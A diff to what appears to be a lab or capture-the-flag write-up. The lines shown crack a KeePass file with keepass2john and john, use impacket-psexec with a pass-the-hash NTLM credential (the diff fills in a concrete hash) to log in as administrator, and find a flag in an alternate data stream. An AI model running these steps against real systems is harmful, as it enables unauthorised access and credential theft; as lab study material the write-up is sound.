@@ -208,7 +208,7 @@ keepass2john CEH.kdbx > ceh.hash
 john --wordlist=rockyou.txt ceh.hash          # → moonshine1!
 
 # "Backup stuff" entry = NTLM hash → pass-the-hash
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<nthash> administrator@10.129.45.110
+impacket-psexec administrator@10.129.45.110  -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 
 # root flag lives in an ADS
 dir /r /a /s                                   # reveals hm.txt:root.txt:$DATA
